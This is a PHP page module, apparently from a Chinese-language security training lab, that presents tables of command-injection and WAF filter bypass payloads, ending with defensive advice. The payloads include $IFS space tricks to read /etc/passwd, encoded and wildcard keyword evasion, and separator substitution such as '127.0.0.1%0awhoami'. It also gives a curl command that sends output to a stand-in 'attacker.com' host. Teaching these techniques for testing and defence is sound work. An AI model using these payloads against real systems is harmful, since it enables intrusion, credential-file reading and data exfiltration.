<?php
// 绕过技巧
$module_name = '绕过技巧';
$module_icon = '🚧';
$module_desc = '常见WAF绕过和过滤绕过方法。';

// 页面内容
$content = <<<HTML
    <div class="card">
        <div class="card-header">
            <h5 class="mb-0">🚧 绕过技巧</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-warning">
                <strong>💡 说明：</strong><br>
                在实际的渗透测试中，经常会遇到WAF（Web应用防火墙）或代码中的过滤机制。<br>
                本场景介绍常见的命令执行和代码执行绕过技巧。
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔤 空格过滤绕过</h6>
                </div>
                <div class="card-body">
                    <table class="table table-bordered">
                        <thead class="table-light">
                            <tr>
                                <th>绕过方法</th>
                                <th>Payload示例</th>
                                <th>适用环境</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>使用&lt;和&lt;&gt;</td>
                                <td><code>cat&lt;/etc/passwd</code></td>
                                <td>Linux</td>
                            </tr>
                            <tr>
                                <td>使用\$IFS</td>
                                <td><code>cat\$IFS/etc/passwd</code></td>
                                <td>Linux</td>
                            </tr>
                            <tr>
                                <td>使用\${IFS}</td>
                                <td><code>cat\${IFS}/etc/passwd</code></td>
                                <td>Linux</td>
                            </tr>
                            <tr>
                                <td>使用\$IFS\$9</td>
                                <td><code>cat\$IFS\$9/etc/passwd</code></td>
                                <td>Linux</td>
                            </tr>
                            <tr>
                                <td>使用%20（URL编码）</td>
                                <td><code>cat%20/etc/passwd</code></td>
                                <td>通用</td>
                            </tr>
                            <tr>
                                <td>使用Tab</td>
                                <td><code>cat\t/etc/passwd</code></td>
                                <td>通用</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔤 关键字过滤绕过</h6>
                </div>
                <div class="card-body">
                    <table class="table table-bordered">
                        <thead class="table-light">
                            <tr>
                                <th>过滤目标</th>
                                <th>绕过方法</th>
                                <th>Payload示例</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>cat</td>
                                <td>使用替代命令</td>
                                <td><code>tac</code>, <code>nl</code>, <code>less</code>, <code>more</code>, <code>head</code>, <code>tail</code></td>
                            </tr>
                            <tr>
                                <td>flag</td>
                                <td>通配符</td>
                                <td><code>/fl*g</code>, <code>/fla?</code>, <code>/[f]lag</code></td>
                            </tr>
                            <tr>
                                <td>flag</td>
                                <td>变量拼接</td>
                                <td><code>a=fl;b=ag;cat /\$a\$b</code></td>
                            </tr>
                            <tr>
                                <td>flag</td>
                                <td>单引号/双引号</td>
                                <td><code>cat /fl''ag</code>, <code>cat /fl""ag</code></td>
                            </tr>
                            <tr>
                                <td>flag</td>
                                <td>反斜杠</td>
                                <td><code>cat /fl\\ag</code></td>
                            </tr>
                            <tr>
                                <td>/etc/passwd</td>
                                <td>Base64编码</td>
                                <td><code>echo L2V0Yy9wYXNzd2Q= | base64 -d | xargs cat</code></td>
                            </tr>
                            <tr>
                                <td>/etc/passwd</td>
                                <td>Hex编码</td>
                                <td><code>echo '2f6574632f706173737764' | xxd -r -p | xargs cat</code></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔤 命令连接符绕过</h6>
                </div>
                <div class="card-body">
                    <table class="table table-bordered">
                        <thead class="table-light">
                            <tr>
                                <th>过滤的连接符</th>
                                <th>替代方案</th>
                                <th>示例</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td><code>;</code> 被过滤</td>
                                <td>使用 <code>%0a</code> (换行)</td>
                                <td><code>127.0.0.1%0awhoami</code></td>
                            </tr>
                            <tr>
                                <td><code>&&</code> 被过滤</td>
                                <td>使用 <code>;</code></td>
                                <td><code>127.0.0.1;whoami</code></td>
                            </tr>
                            <tr>
                                <td><code>|</code> 被过滤</td>
                                <td>使用 <code>||</code></td>
                                <td><code>127.0.0.1||whoami</code></td>
                            </tr>
                            <tr>
                                <td><code>&</code> 被过滤</td>
                                <td>使用 <code>%26</code></td>
                                <td><code>127.0.0.1%26whoami</code></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔤 无字母数字绕过</h6>
                </div>
                <div class="card-body">
                    <p>当过滤了所有字母和数字时，可以使用以下技巧：</p>
                    <table class="table table-bordered">
                        <thead class="table-light">
                            <tr>
                                <th>技巧</th>
                                <th>说明</th>
                                <th>示例</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>Shell变量</td>
                                <td>使用\${##}等获取数字</td>
                                <td><code>\${#} = 0</code>, <code>\${##} = 1</code></td>
                            </tr>
                            <tr>
                                <td>通配符</td>
                                <td>使用*和?匹配命令</td>
                                <td><code>/???/???/c?t /???/p????d</code></td>
                            </tr>
                            <tr>
                                <td>反引号</td>
                                <td>嵌套执行</td>
                                <td><code>\`\`</code></td>
                            </tr>
                            <tr>
                                <td>~扩展</td>
                                <td>使用~用户目录</td>
                                <td><code>~root</code>, <code>~nobody</code></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔤 长度限制绕过</h6>
                </div>
                <div class="card-body">
                    <p>当命令长度被限制时（如只能输入7个字符）：</p>
                    <pre class="bg-dark text-light p-3 rounded"><code># 写入命令到文件
>w\n>cat\n>\*\n>\>\g\n>fl\n>ag\n# 执行
sh g
# 或者
sh fl*</code></pre>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔤 无回显绕过</h6>
                </div>
                <div class="card-body">
                    <table class="table table-bordered">
                        <thead class="table-light">
                            <tr>
                                <th>方法</th>
                                <th>Payload示例</th>
                                <th>说明</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>DNS外带</td>
                                <td><code>whoami.dnslog.cn</code></td>
                                <td>通过DNS查询外带数据</td>
                            </tr>
                            <tr>
                                <td>HTTP外带</td>
                                <td><code>curl http://attacker.com/\`whoami\`</code></td>
                                <td>通过HTTP请求外带数据</td>
                            </tr>
                            <tr>
                                <td>时间盲注</td>
                                <td><code>sleep 5</code></td>
                                <td>通过延迟判断命令执行</td>
                            </tr>
                            <tr>
                                <td>写文件</td>
                                <td><code>whoami > /tmp/1.txt</code></td>
                                <td>写入文件后读取</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h6>🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <ol>
                        <li><strong>白名单过滤：</strong>只允许预期的字符和命令</li>
                        <li><strong>参数化：</strong>使用参数化方式传递命令参数</li>
                        <li><strong>WAF：</strong>部署专业的Web应用防火墙</li>
                        <li><strong>最小权限：</strong>web服务以最低权限运行</li>
                        <li><strong>禁用危险函数：</strong>在php.ini中禁用危险函数</li>
                        <li><strong>监控日志：</strong>记录和分析异常请求</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>
HTML;

// 包含模板
include '../template/module_template.php';
?>